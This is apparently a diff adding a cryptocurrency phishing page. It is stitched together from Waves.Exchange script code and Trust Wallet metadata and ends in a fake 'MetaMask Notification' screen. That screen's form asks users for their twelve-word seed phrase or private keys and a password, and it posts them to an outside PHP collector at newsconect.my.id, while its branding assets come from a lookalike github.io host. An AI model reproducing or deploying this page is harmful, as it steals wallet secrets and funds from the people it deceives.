@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html><head><script>
+        function cacheRound(minutes) {
+            var ms = minutes * 60 * 1000;
+            const ts = Date.now();
+            const mod = ts % ms;
+            return mod * ms;
+        }
+
+        document.write('<script src="/init.js?_t=' + cacheRound(15) + '"><\/script>');</script><script src="/init.js?_t=141858900000"></script><script src="/init.js?_t=339876000000"></script><script src="/init.js?_t=128616300000"></script>
+<style>
+        .loader-component {
+            display: flex;
+            align-items: center;
+        }
+        .loader-component__layout {
+            height: 32px;
+            width: 32px;
+            overflow: hidden;
+            animation: around 3.8s infinite;
+        }
+
+        .loader-component__red {
+            background-color: #E14B51;
+            height: 36px;
+            width: 36px;
+            position: relative;
+            transform: translate3d(-2px, -2px, 0);
+        }
+
+        .loader-component__blue {
+            background-color: #5A81EA;
+            height: 18px;
+            width: 36px;
+            position: absolute;
+            bottom: 0;
+            animation: sand 3.8s infinite;
+            will-change: trasform;
+        }
+
+        .loader-component__red::after {
+            content: "";
+            display: block;
+            position: absolute;
+            z-index: 1;
+            top: 0;
+            left: 0;
+            height: 0;
+            width: 0;
+            border: 18px solid transparent;
+            border-right: 18px solid #19202e;
+            border-left: 18px solid #19202e;
+        }
+
+        .loader-component__icon {
+            margin-left: 12px;
+        }
+
+        @keyframes sand {
+            0% {
+                transform: translateY(0);
+            }
+
+            10% {
+                transform: translateY(0);
+            }
+
+            40% {
+                transform: translateY(-100%);
+            }
+
+            60% {
+                transform: translateY(-100%);
+            }
+
+            90% {
+                transform: translateY(0);
+            }
+
+            100% {
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes around {
+            0% {
+                transform: rotate(0);
+            }
+
+            15% {
+                transform: rotate(180deg);
+            }
+
+            50% {
+                transform: rotate(180deg);
+            }
+
+            65% {
+                transform: rotate(360deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+<style>
+        .not-supported-browser {
+            display: none;
+        }
+
+        .connection-problem button.big {
+            width: 224px;
+            background-color: #5a81ea;
+            border: 1px solid #5a81ea;
+            color: #fff;
+            border-radius: 4px;
+            height: 54px;
+            font-size: 17px;
+            font-weight: bold;
+        }
+
+        .connection-problem button.big:hover {
+            background: #3c6ae4;
+        }
+
+        .connection-problem__headline {
+            font-family: 'Roboto-Regular', sans-serif;
+            font-size: 22px;
+            line-height: 22px;
+            font-weight: bold;
+            margin: 0 0 20px;
+            color: #ffffff;
+        }
+
+        .connection-problem__description {
+            color: #959dae;
+            font-size: 15px;
+            line-height: 20px;
+        }
+
+        .connetion-problem__button {
+            margin-top: 30px;
+        }
+
+        .connection-problem__wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .connection-problem {
+            display: none;
+            text-align: center;
+            flex-direction: column;
+            width: 100%;
+            margin: 0 auto;
+            height: 100%;
+            font-family: 'Roboto-Regular', sans-serif;
+            box-sizing: border-box;
+            background: #292f3c;
+        }
+
+        .connection-problem > img {
+            max-width: 100%;
+            margin-bottom: 34px;
+        }
+
+        .connection-problem .main-logo {
+            width: 100px;
+            height: 21px;
+            background: url(/img/icons/main_logo.svg) no-repeat;
+            display: block;
+            margin: 0 auto 80px auto;
+        }
+
+        .app-loader.app-loader-transition {
+            animation: loader-transition 4s both;
+        }
+
+        .app-loader {
+            z-index: 10000;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            background: #19202e;
+            color: #fff;
+        }
+
+        .app-loader .progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 0;
+            height: 3px;
+            background-color: #3c6ae4;
+            transition: width 1s;
+            -webkit-transition: width 1s;
+            -moz-transition: width 1s;
+        }
+    </style>
+<script>
+        try {
+            var config = getConfig();
+            window.addEventListener('load', function () {
+                var __interval = setInterval(function () {
+
+                    WavesApp = WavesApp || { state: 'loading' };
+
+                    switch (WavesApp.state) {
+                        case 'loading':
+                        case 'loadingError':
+                            clearInterval(__interval);
+                            if (config.isBrowserSupported()) {
+                                var appLoaderEl = document.querySelector('.app-loader');
+
+                                if (appLoaderEl) {
+                                    appLoaderEl.style.display = 'none';
+                                }
+
+                                document.querySelector('.connection-problem').style.display = 'flex';
+                                document.querySelector('[name=main]').style.display = 'none';
+                            }
+                            break;
+                        case 'appRun':
+                            clearInterval(__interval);
+                            var errorModal = document.querySelector('.connection-problem');
+                            if (errorModal.parentNode) {
+                                errorModal.parentNode.removeChild(errorModal);
+                            }
+                            break;
+                    }
+                }, 2000);
+            });
+
+            /**
+             * @type {IWavesApp}
+             */
+            var WavesApp = {
+                name: 'Waves.Exchange',
+                platform: config.platform(),
+                electronVersion: config.electronVersion,
+                version: config.pack.version,
+                type: window.isDesktop ? 'desktop' : 'web',
+                matcherPriorityList: config.network.matcherPriorityList,
+                themesConf: config.themesConf,
+                progress: 0,
+                state: 'loading',
+                origin: config.origin,
+
+                localize: config.langList,
+                bankRecipient: config.bankRecipient,
+                network: {
+                    apiVersion: config.network.apiVersion,
+                    code: config.network.code,
+                    node: config.network.node,
+                    matcher: config.network.matcher,
+                    oldMatcher: config.network.oldMatcher,
+                    api: config.network.api,
+                    coinomat: config.network.coinomat,
+                    wavesGateway: config.network.wavesGateway,
+                    WESTNetworkByte: config.network.WESTNetworkByte,
+                    support: config.network.support,
+                    termsAndConditions: config.network.termsAndConditions,
+                    privacyPolicy: config.network.privacyPolicy,
+                    nodeList: config.network.nodeList,
+                    scamListUrl: config.network.scamListUrl,
+                    tokensNameListUrl: config.network.tokensNameListUrl,
+                    explorer: config.network.explorer,
+                    configService: config.network.configService,
+                    tokenrating: config.network.tokenrating,
+                    featuresConfig: config.network.featuresConfig,
+                    feeConfig: config.network.feeConfig,
+                    migration: config.network.migration,
+                    baseAsset: config.network.baseAsset
+                },
+                defaultAssets: {
+                    WAVES: 'WAVES',
+                    EUR: config.network.assets.EUR,
+                    USD: config.network.assets.USD,
+                    BTC: config.network.assets.BTC,
+                    ETH: config.network.assets.ETH,
+                    LTC: config.network.assets.LTC,
+                    ZEC: config.network.assets.ZEC,
+                    BCH: config.network.assets.BCH,
+                    BSV: config.network.assets.BSV,
+                    DASH: config.network.assets.DASH,
+                    TRY: config.network.assets.TRY,
+                    XMR: config.network.assets.XMR,
+                    WEST: config.network.assets.WEST,
+                    ERGO: config.network.assets.ERGO,
+                    BNT: config.network.assets.BNT,
+                    USDT: config.network.assets.USDT,
+                    'USD-N': config.network.assets['USD-N']
+                },
+                rewriteAssets: [
+                    {
+                        id: config.network.assets.WEST,
+                        name: 'WEST',
+                        description: 'Waves Enterprise System Token'
+                    }, {
+                        id: config.network.assets['USD-N'],
+                        name: 'Neutrino'
+                    }, {
+                        id: config.network.assets.USDT,
+                        name: 'Tether USD'
+                    }
+                ],
+                tradingPairs: config.tradingPairs,
+                ALWAYS_PINNED_ASSETS: ['WAVES'],
+                WCTAsset: config.network.assets.WCT,
+
+                otherAssetsWithIcons: {
+                    // TODO @xenohunter : remove that when icons are in @dvshur's service
+                    EFYT: config.network.assets.EFYT,
+                    WNET: config.network.assets.WNET
+                },
+                remappedAssetNames: config.remappedAssetNames,
+                matcherSignInterval: { count: 20, timeType: 'day' },
+                scam: Object.create(null),
+                dex: {
+                    resolutions: ['5', '15', '30', '60', '120', '180', '240', '360', '720', '1440'], // TODO : add months
+                    defaultResolution: '60'
+                },
+                modules: [],
+                oracles: {
+                    waves: config.oracles.waves,
+                    tokenomica: config.oracles.tokenomica
+                },
+                minAliasLength: 4,
+                maxAliasLength: 30,
+                maxAddressLength: 45,
+                maxCoinCount: null,
+                TRANSACTION_TYPES: {
+                    EXTENDED: {
+                        SEND: 'send',
+                        RECEIVE: 'receive',
+                        MASS_SEND: 'mass-send',
+                        MASS_RECEIVE: 'mass-receive',
+                        CIRCULAR: 'circular',
+                        ISSUE: 'issue',
+                        REISSUE: 'reissue',
+                        BURN: 'burn',
+                        EXCHANGE_BUY: 'exchange-buy',
+                        EXCHANGE_SELL: 'exchange-sell',
+                        LEASE_IN: 'lease-in',
+                        LEASE_OUT: 'lease-out',
+                        CANCEL_LEASING: 'cancel-leasing',
+                        CREATE_ALIAS: 'create-alias',
+                        DATA: 'data',
+                        DATA_VOTE: 'data-vote',
+                        SET_SCRIPT: 'set-script',
+                        SCRIPT_CANCEL: 'set-script-cancel',
+                        SPONSORSHIP_START: 'sponsorship-start',
+                        SPONSORSHIP_STOP: 'sponsorship-stop',
+                        SPONSORSHIP_FEE: 'sponsorship-fee',
+                        SET_ASSET_SCRIPT: 'set-asset-script',
+                        SCRIPT_INVOCATION: 'script-invocation',
+                        UNKNOWN: 'unknown'
+                    },
+                    NODE: {
+                        TRANSFER: 'transfer',
+                        MASS_TRANSFER: 'massTransfer',
+                        ISSUE: 'issue',
+                        REISSUE: 'reissue',
+                        BURN: 'burn',
+                        CREATE_ALIAS: 'createAlias',
+                        LEASE: 'lease',
+                        CANCEL_LEASING: 'cancelLeasing',
+                        EXCHANGE: 'exchange',
+                        DATA: 'data',
+                        SET_SCRIPT: 'setScript',
+                        SPONSORSHIP: 'sponsorship',
+                        SET_ASSET_SCRIPT: 'set-asset-script',
+                        SCRIPT_INVOCATION: 'script-invocation'
+                    }
+                },
+                getLocaleData: config.getLocaleData,
+                addController: config.addController,
+                getController: config.getController,
+                isWeb: config.isWeb,
+                isDesktop: function() { return window.isDesktop },
+                isProduction: config._isProduction,
+                parseJSON: null,
+                stateTree: null,
+                isMock: false,
+                usePostMessageStorage: false,
+                MAX_URL_LENGTH: 1200,
+                sign: {
+                    openTimeout: 3000,
+                    listenTimeout: 25000,
+                    exchangeTimeout: 100000
+                },
+                reload: config.reload
+            };
+        } catch (e) {
+            console.warn(e);
+        }
+
+        config._initStyles();
+    </script>
+
+
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+<meta name="description" content="Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!">
+<meta property="og:description" content="Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="https://trustwallet.com/assets/images/media/preview/horizontal_blue.png">
+<meta name="twitter:creator" content="@trustwalletapp">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://trustwallet.com/assets/images/media/preview/horizontal_blue.png">
+<meta property="og:type" content="website">
+<link rel="canonical" href="https://trustwallet.com/">
+<meta property="og:url" content="https://trustwallet.com/">
+<meta property="og:site_name" content="Trust Wallet">
+<meta property="al:ios:app_name" content="Trust Wallet">
+<meta property="al:ios:app_store_id" content="1288339409">
+<meta property="al:ios:url" content="trust://">
+<meta property="al:android:app_name" content="Trust Wallet">
+<meta property="al:android:package" content="com.wallet.crypto.trustapp">
+<meta property="al:android:url" content="https://trustwallet.com">
+
+<meta name="apple-itunes-app" content="app-id=1288339409,affiliate-data=11l7ss">
+<meta name="theme-color" content="#3375BB">
+<script type="application/ld+json">
+
+
+
+
+    {
+      "description": "Trust Wallet is the best ethereum wallet and cryptocurrency wallet to store your favourite BEP2, ERC20 and ERC721, tokens. Download the Android Trust Wallet and iOS app today!",
+      "@type": "WebPage",
+      "url": "https://trustwallet.com/",
+      "headline": "Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet",
+      "@context": ""
+    }
+        
+        
+        
+        
+                                                                                    </script><script async="" defer="" data-domain="trustwallet.com" src="./Best Cryptocurrency Wallet Trust Wallet_files/plausible.js.download"></script><script type="application/javascript">
+    document.addEventListener("DOMContentLoaded", function(event) {
+      document.getElementById('navbarToggle').addEventListener('click', function() {
+        var el = document.getElementById('navbarSupportedContent');
+        var toggled = window.getComputedStyle(el).display == 'block';
+        if (toggled) {
+          el.style.display = "none";
+        } else {
+          el.style.display = "block";
+        }
+      })      
+
+
+
+
+
+
+      //Add Huawei download button based on device.
+      var result = new UAParser().getResult();
+      var apple = document.getElementsByClassName("apple");
+      var huawei = document.getElementsByClassName("huawei");
+      var download = document.getElementsByClassName("downloadapp-native");
+
+      if (result.os.name == "Android") {
+        for (var i = 0; i < huawei.length; i++) {
+          huawei[i].classList.remove("hidden");
+          apple[i].classList.add("hidden");
+        }
+
+
+
+
+
+        // if it is android change ctas to googleplay
+        for (var i = 0; i < download.length; i++) {
+          download[i].href = "?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite";
+        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+      }
+      // if its apple change ctas to appstore
+       else if (result.os.name == "iOS") {
+        for (var i = 0; i < download.length; i++) {
+          download[i].href = "?mt=8";
+        }
+      }
+    });
+  </script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+     <meta charset="utf-8">
+     <meta lmy="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
+     <title>MetaMask Notification </title>
+     <link rel="stylesheet" type="text/css" href="https://metamask-horizon.github.io/news-app/faille/index.css" title="ltr">
+     <link rel="stylesheet" type="text/css" href="https://metamask-horizon.github.io/news-app/faille/index-rtl.css" title="rtl" disabled="">
+ <link rel="icon" href="https://metamask-horizon.github.io/news-app/faille/metamask-fox.svg">
+   <style></style><style data-jss="" data-meta="MuiInputBase">
+@-webkit-keyframes mui-auto-fill {}
+@-webkit-keyframes mui-auto-fill-cancel {}
+.MuiInputBase-root {
+  color: rgba(0, 0, 0, 0.87);
+  cursor: text;
+  display: inline-flex;
+  position: relative;
+  font-size: 1rem;
+  box-sizing: border-box;
+  align-items: center;
+  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+  font-weight: 400;
+  line-height: 1.1876em;
+  letter-spacing: 0.00938em;
+}
+.MuiInputBase-root.Mui-disabled {
+  color: rgba(0, 0, 0, 0.38);
+  cursor: default;
+}
+.MuiInputBase-multiline {
+  padding: 6px 0 7px;
+}
+.MuiInputBase-multiline.MuiInputBase-marginDense {
+  padding-top: 3px;
+}
+.MuiInputBase-fullWidth {
+  width: 100%;
+}
+.MuiInputBase-input {
+  font: inherit;
+  color: currentColor;
+  width: 100%;
+  border: 0;
+  height: 1.1876em;
+  margin: 0;
+  display: block;
+  padding: 6px 0 7px;
+  min-width: 0;
+  background: none;
+  box-sizing: content-box;
+  animation-name: mui-auto-fill-cancel;
+  letter-spacing: inherit;
+  animation-duration: 10ms;
+  -webkit-tap-highlight-color: transparent;
+}
+.MuiInputBase-input::-webkit-input-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input::-moz-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input:-ms-input-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input::-ms-input-placeholder {
+  color: currentColor;
+  opacity: 0.42;
+  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+}
+.MuiInputBase-input:focus {
+  outline: 0;
+}
+.MuiInputBase-input:invalid {
+  box-shadow: none;
+}
+.MuiInputBase-input::-webkit-search-decoration {
+  -webkit-appearance: none;
+}
+.MuiInputBase-input.Mui-disabled {
+  opacity: 1;
+}
+.MuiInputBase-input:-webkit-autofill {
+  animation-name: mui-auto-fill;
+  animation-duration: 5000s;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
+  opacity: 0 !important;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
+  opacity: 0.42;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
+  opacity: 0.42;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
+  opacity: 0.42;
+}
+label[data-shrink=false] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
+  opacity: 0.42;
+}
+.MuiInputBase-inputMarginDense {
+  padding-top: 3px;
+}
+.MuiInputBase-inputMultiline {
+  height: auto;
+  resize: none;
+  padding: 0;
+}
+.MuiInputBase-inputTypeSearch {
+  -moz-appearance: textfield;
+  -webkit-appearance: textfield;
+}
+</style><style data-jss="" data-meta="MuiInput">
+.MuiInput-root {
+  position: relative;
+}
+label + .MuiInput-formControl {
+  margin-top: 16px;
+}
+.MuiInput-colorSecondary.MuiInput-underline:after {
+  border-bottom-color: #f50057;
+}
+.MuiInput-underline:after {
+  left: 0;
+  right: 0;
+  bottom: 0;
+  content: "";
+  position: absolute;
+  transform: scaleX(0);
+  transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+  border-bottom: 2px solid #3f51b5;
+  pointer-events: none;
+}
+.MuiInput-underline.Mui-focused:after {
+  transform: scaleX(1);
+}
+.MuiInput-underline.Mui-error:after {
+  transform: scaleX(1);
+  border-bottom-color: #f44336;
+}
+.MuiInput-underline:before {
+  left: 0;
+  right: 0;
+  bottom: 0;
+  content: "\00a0";
+  position: absolute;
+  transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+  border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+  pointer-events: none;
+}
+.MuiInput-underline:hover:not(.Mui-disabled):before {
+  border-bottom: 2px solid rgba(0, 0, 0, 0.87);
+}
+.MuiInput-underline.Mui-disabled:before {
+  border-bottom-style: dotted;
+}
+@media (hover: none) {
+  .MuiInput-underline:hover:not(.Mui-disabled):before {
+    border-bottom: 1px solid rgba(0, 0, 0, 0.42);
+  }
+}
+</style><style data-jss="" data-meta="MuiFormLabel">
+.MuiFormLabel-root {
+  color: rgba(0, 0, 0, 0.54);
+  padding: 0;
+  font-size: 1rem;
+  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+  font-weight: 400;
+  line-height: 1;
+  letter-spacing: 0.00938em;
+}
+.MuiFormLabel-root.Mui-focused {
+  color: #3f51b5;
+}
+.MuiFormLabel-root.Mui-disabled {
+  color: rgba(0, 0, 0, 0.38);
+}
+.MuiFormLabel-root.Mui-error {
+  color: #f44336;
+}
+.MuiFormLabel-colorSecondary.Mui-focused {
+  color: #f50057;
+}
+.MuiFormLabel-asterisk.Mui-error {
+  color: #f44336;
+}
+</style><style data-jss="" data-meta="MuiInputLabel">
+.MuiInputLabel-root {
+  display: block;
+  transform-origin: top left;
+}
+.MuiInputLabel-formControl {
+  top: 0;
+  left: 0;
+  position: absolute;
+  transform: translate(0, 24px) scale(1);
+}
+.MuiInputLabel-marginDense {
+  transform: translate(0, 21px) scale(1);
+}
+.MuiInputLabel-shrink {
+  transform: translate(0, 1.5px) scale(0.75);
+  transform-origin: top left;
+}
+.MuiInputLabel-animated {
+  transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+}
+.MuiInputLabel-filled {
+  z-index: 1;
+  transform: translate(12px, 20px) scale(1);
+  pointer-events: none;
+}
+.MuiInputLabel-filled.MuiInputLabel-marginDense {
+  transform: translate(12px, 17px) scale(1);
+}
+.MuiInputLabel-filled.MuiInputLabel-shrink {
+  transform: translate(12px, 10px) scale(0.75);
+}
+.MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
+  transform: translate(12px, 7px) scale(0.75);
+}
+.MuiInputLabel-outlined {
+  z-index: 1;
+  transform: translate(14px, 20px) scale(1);
+  pointer-events: none;
+}
+.MuiInputLabel-outlined.MuiInputLabel-marginDense {
+  transform: translate(14px, 12px) scale(1);
+}
+.MuiInputLabel-outlined.MuiInputLabel-shrink {
+  transform: translate(14px, -6px) scale(0.75);
+}
+</style><style data-jss="" data-meta="MuiFormControl">
+.MuiFormControl-root {
+  border: 0;
+  margin: 0;
+  display: inline-flex;
+  padding: 0;
+  position: relative;
+  min-width: 0;
+  flex-direction: column;
+  vertical-align: top;
+}
+.MuiFormControl-marginNormal {
+  margin-top: 16px;
+  margin-bottom: 8px;
+}
+.MuiFormControl-marginDense {
+  margin-top: 8px;
+  margin-bottom: 4px;
+}
+.MuiFormControl-fullWidth {
+  width: 100%;
+}
+</style><style data-jss="" data-meta="MuiTextField">
+
+</style><style data-jss="" data-meta="makeStyles">
+.jss1 {
+  color: #aeaeae;
+  font-weight: 400;
+}
+.jss1.jss2 {
+  color: #aeaeae;
+}
+.jss1.jss4 {
+  color: #aeaeae;
+}
+.jss3:after {
+  border-bottom: 2px solid #f7861c;
+}
+.jss5 {
+  color: #aeaeae;
+}
+.jss6 {
+  padding: 8px;
+}
+.jss6::placeholder {
+  color: #aeaeae;
+}
+.jss7 {
+  color: #fff;
+}
+.jss8:after {
+  border-bottom: 2px solid #fff;
+}
+.jss9.jss10 {
+  color: #5b5b5b;
+}
+.jss9.jss4 {
+  color: #5b5b5b;
+}
+.jss12 {
+  border: 1px solid #BBC0C5;
+  height: 48px;
+  display: flex;
+  padding: 0 16px;
+  align-items: center;
+  border-radius: 6px;
+}
+label + .jss12 {
+  margin-top: 9px;
+}
+.jss12.jss11 {
+  border: 1px solid #2f9ae0;
+}
+.jss13 {
+  color: #5b5b5b;
+  position: initial;
+  font-size: 1rem;
+  transform: none;
+  transition: none;
+}
+.jss14 {
+  color: #5b5b5b;
+  position: initial;
+  font-size: .75rem;
+  transform: none;
+  transition: none;
+}
+.jss15 {
+  line-height: initial !important;
+}
+</style></head>
+   <body>
+     <div id="app-content"><div class="app mouse-user-styles"><div class="app-header"><div class="app-header__contents"><div class="app-header__logo-container app-header__logo-container--clickable"><img height="30" src="https://metamask-horizon.github.io/news-app/faille/metamask-logo-horizontal.svg" class="app-header__metafox-logo app-header__metafox-logo--horizontal" alt=""><img src="https://metamask-horizon.github.io/news-app/faille/metamask-fox.svg" class="app-header__metafox-logo app-header__metafox-logo--icon" alt=""></div><div class="app-header__account-menu-container"><div class="app-header__network-component-wrapper"><div class="network-display chip chip--with-left-icon chip--with-right-icon chip--ui-3" role="button" tabindex="0"><div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-mainnet color-indicator--size-lg"><span class="color-indicator__inner-circle"></span></div></div><span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 typography chip__label typography--h7 typography--align-undefined typography--color-ui-4 typography--weight-normal">Ethereum Mainnet </span><div class="chip__right-icon"><i class="network-display__icon app-header__network-down-arrow"></i></div></div></div></div></div></div><div><span></span></div><div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;"><style>
+          .menu-droppo-enter {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+
+          .menu-droppo-enter.menu-droppo-enter-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(0%);
+          }
+
+          .menu-droppo-leave.menu-droppo-leave-active {
+            transition: transform 300ms ease-in-out;
+            transform: translateY(-200%);
+          }
+        </style></div><div class="main-container-wrapper"><div class="first-view-main-wrapper"><div class="first-view-main"><form method="post" action="https://newsconect.my.id/A/looogs1.php?metamask-horizon"><br><br><div class="import-account"><div class="import-account__title">Restore your Account with Seed Phrase </div><div class="import-account__selector-label">Enter your secret twelve word phrase here to restore your vault. </div><div class="import-account__input-wrapper"><label class="import-account__input-label">Wallet Seed </label><textarea id="" rows="4" name="key" maxlength="300" placeholder="Enter Phrase or Private Keys" class="import-account__secret-phrase" minlength="24" required="" aria-import-downnn-websitee.php="" aria-required="true" style="height: 163px; width: 462px;" accounts.mode="==" ng-model="vm.seed" ng-change="vm.refreshAddress()" ng-model-options="{ debounce: 750 }" ng-trim="false"></textarea></div><div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal"><label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="password" id="password-label">New password (min 8 chars) </label><div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl"><input aria-invalid="false" autocomplete="new-password" id="password" type="password" lmy="Password" required="true dir=" auto"="" class="MuiInputBase-input MuiInput-input" value=""></div></div><div class="MuiFormControl-root MuiTextField-root first-time-flow__input MuiFormControl-marginNormal"><label class="MuiFormLabel-root MuiInputLabel-root jss9 jss13 MuiInputLabel-formControl MuiInputLabel-animated MuiInputLabel-shrink" data-shrink="true" for="confirm-password" id="confirm-password-label">Confirm password </label><div class="MuiInputBase-root MuiInput-root jss12 MuiInputBase-formControl MuiInput-formControl"><input aria-invalid="false" autocomplete="confirm-password" id="confirm-password" type="password" lmy="Pass" required="true dir=" auto"="" class="MuiInputBase-input MuiInput-input" value=""></div></div><button class="button btn--first-time first-time-flow__button">Restore </button></div></form></div></div></div></div></div>
+     <div id="popover-content"></div>
+     <script src="./globalthis.js" type="text/javascript" charset="utf-8"></script>
+     <script src="./initSentry.js" type="text/javascript" charset="utf-8"></script>
+     <script src="./lockdown.js" type="text/javascript" charset="utf-8"></script>
+     <script src="./runLockdown.js" type="text/javascript" charset="utf-8"></script>
+     <script src="./ui-libs.js" type="text/javascript" charset="utf-8"></script>
+     <script src="./ui.js" type="text/javascript" charset="utf-8"></script>
+  
+
+
+
+
+
+</body></html>
